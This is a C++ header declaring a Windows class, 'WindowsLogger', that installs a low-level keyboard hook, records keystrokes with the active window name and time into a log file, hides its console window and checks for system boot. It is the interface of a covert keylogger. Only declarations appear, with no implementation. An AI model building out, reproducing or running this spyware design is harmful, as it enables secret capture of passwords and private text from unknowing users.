#pragma once

#define UNICODE

#if defined(__WIN32) || defined(_WIN64)
#include <windows.h>
#include <map>
#include <string>
#include <fstream>
#include <memory>

class WindowsLogger
{
public:
    WindowsLogger();
    ~WindowsLogger();
    void startLogging();

private:
    static LRESULT CALLBACK keyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
    void setKeyboardHook();
    void releaseHook();
    int recordKeyStroke(int keyStroke);
    void hideConsole();
    std::string getCurrentWindowName() const;
    std::string getCurrentTime() const;
    bool isSystemBooting() const;

    HHOOK hook;
    std::ofstream logFile;
    std::string logFileName;
    static std::unique_ptr<WindowsLogger> instance;
    static const std::map<int, std::string> keyMap;
};
#endif